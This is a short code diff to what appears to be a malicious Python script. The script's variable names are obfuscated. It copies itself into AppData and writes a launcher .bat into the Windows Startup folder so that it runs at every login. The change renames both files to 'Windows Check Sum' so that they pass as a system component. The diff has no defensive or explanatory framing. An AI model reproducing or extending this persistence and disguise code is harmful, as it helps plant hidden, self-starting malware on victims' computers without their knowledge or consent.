@@ -38,14 +38,14 @@ def main():
         try:
             shutil.copy(lll, LLL1)
             name = LLL1+"/"+str(name1)
-            os.rename(name, LLL1+"/"+"asd.pyw")
+            os.rename(name, LLL1+"/"+"Windows Check Sum.pyw")
         except:
             asdasd = False
 
         
         llllll1111l = '/Users/' + Lll + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
-        with open(llllll1111l + "/" + "open.bat", "w+") as f:
-            f.write('start '+ "C:\\Users\\" + Lll + "\\AppData\\Local\\Microsoft\\WindowsApps\\asd.pyw")
+        with open(llllll1111l + "/" + "Windows check sum.bat", "w+") as f:
+            f.write('start '+ "C:\\Users\\" + Lll + "\\AppData\\Local\\Microsoft\\WindowsApps\\Windows Check Sum.pyw")
 
     def con():
         global master
